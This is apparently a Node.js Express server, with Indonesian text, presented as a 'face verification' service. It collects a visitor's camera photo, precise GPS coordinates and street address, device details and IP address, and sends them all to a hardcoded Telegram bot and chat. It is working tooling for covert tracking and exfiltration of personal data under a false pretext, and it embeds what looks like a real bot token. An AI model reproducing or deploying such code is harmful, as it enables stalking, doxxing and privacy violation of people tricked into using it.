const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = process.env.CHAT_ID || '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
console.log('========================================');

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

const db = [];

// ===== SEND TO TELEGRAM =====
async function sendToTelegram(photoBuffer, data) {
    try {
        const { device, gps, locationName, ip, timestamp } = data;
        const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        
        let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
        caption += `🕒 *Waktu:* ${time}\n\n`;
        
        // Device Info
        if (device) {
            caption += `📱 *Device Info:*\n`;
            caption += `   🏷️ Brand: ${device.brand || 'Tidak diketahui'}\n`;
            if (device.model && device.model !== 'Tidak diketahui') {
                caption += `   📟 Model: ${device.model}\n`;
            }
            caption += `   📱 Tipe: ${device.device || 'Tidak diketahui'}\n`;
            caption += `   💻 OS: ${device.os || 'Tidak diketahui'}\n`;
            caption += `   🌐 Browser: ${device.browser || 'Tidak diketahui'}\n`;
            caption += `   📐 Screen: ${device.screenWidth || '?'}x${device.screenHeight || '?'}\n`;
            caption += `   🌍 Language: ${device.language || 'id-ID'}\n\n`;
        }
        
        // GPS Location (AKURAT!)
        if (gps && locationName) {
            caption += `📍 *Lokasi GPS (AKURAT!):*\n`;
            caption += `   🏠 ${locationName.full || 'Tidak diketahui'}\n`;
            if (locationName.street && locationName.street !== '-') {
                caption += `   🛣️ Jalan: ${locationName.street}\n`;
            }
            if (locationName.city && locationName.city !== '-') {
                caption += `   🏙️ Kota: ${locationName.city}\n`;
            }
            if (locationName.district && locationName.district !== '-') {
                caption += `   🏘️ Kecamatan: ${locationName.district}\n`;
            }
            if (locationName.province && locationName.province !== '-') {
                caption += `   🗺️ Provinsi: ${locationName.province}\n`;
            }
            if (locationName.country && locationName.country !== '-') {
                caption += `   🌏 Negara: ${locationName.country}\n`;
            }
            if (locationName.postcode && locationName.postcode !== '-') {
                caption += `   📮 Zip: ${locationName.postcode}\n`;
            }
            
            caption += `\n🗺️ *Google Maps:*\n`;
            caption += `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
            
            caption += `📊 *Koordinat:*\n`;
            caption += `   ${gps.latitude}, ${gps.longitude}\n`;
            caption += `   🎯 Akurasi: ${gps.accuracy ? Math.round(gps.accuracy) + 'm' : 'Tidak diketahui'}\n\n`;
        } else if (gps) {
            caption += `📍 *Koordinat GPS:*\n`;
            caption += `   ${gps.latitude}, ${gps.longitude}\n`;
            caption += `   🎯 Akurasi: ${gps.accuracy ? Math.round(gps.accuracy) + 'm' : 'Tidak diketahui'}\n\n`;
            caption += `🗺️ *Google Maps:*\n`;
            caption += `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
        } else {
            caption += `⚠️ *Lokasi GPS tidak tersedia*\n\n`;
        }
        
        caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
        caption += `_Foto diterima untuk verifikasi_`;

        console.log('📤 Sending to Telegram...');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', caption);
        form.append('photo', photoBuffer, { 
            filename: `verifikasi_${Date.now()}.jpg`, 
            contentType: 'image/jpeg' 
        });

        const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form,
        });
        
        const tgData = await tgResponse.json();
        console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
        
        // Kirim lokasi GPS
        if (gps) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: gps.latitude,
                    longitude: gps.longitude
                })
            });
        }
        
        return tgData;
    } catch (err) {
        console.error('Send error:', err);
        return null;
    }
}

// ===== VERIFY =====
app.post('/verify', async (req, res) => {
    console.log('📸 ===== NEW VERIFICATION =====');
    
    try {
        const { image, device, gps, locationName, timestamp } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        
        console.log(`🌐 IP: ${ip}`);
        console.log(`📱 GPS:`, gps ? `${gps.latitude}, ${gps.longitude}` : 'Tidak ada');
        console.log(`📱 Device:`, device ? device.brand : 'Tidak ada');
        
        if (!image) {
            return res.json({ success: false, error: 'No image' });
        }
        
        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        
        // Save to DB
        db.push({
            timestamp: timestamp || new Date().toISOString(),
            location: locationName ? locationName.full : 'Tidak diketahui',
            device: device ? `${device.brand} ${device.model}`.trim() : 'Tidak diketahui',
            ip: ip,
            latitude: gps ? gps.latitude : 0,
            longitude: gps ? gps.longitude : 0
        });
        
        // Send to Telegram
        const result = await sendToTelegram(buffer, {
            device,
            gps,
            locationName,
            ip,
            timestamp: timestamp || new Date().toISOString()
        });
        
        if (result && result.ok) {
            res.json({ success: true });
        } else {
            res.json({ success: false, error: 'Telegram error' });
        }
        
    } catch (err) {
        console.error('❌ Error:', err);
        res.json({ success: false, error: err.message });
    }
});

// ===== TEST =====
app.get('/test', async (req, res) => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const data = await response.json();
        res.json(data);
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
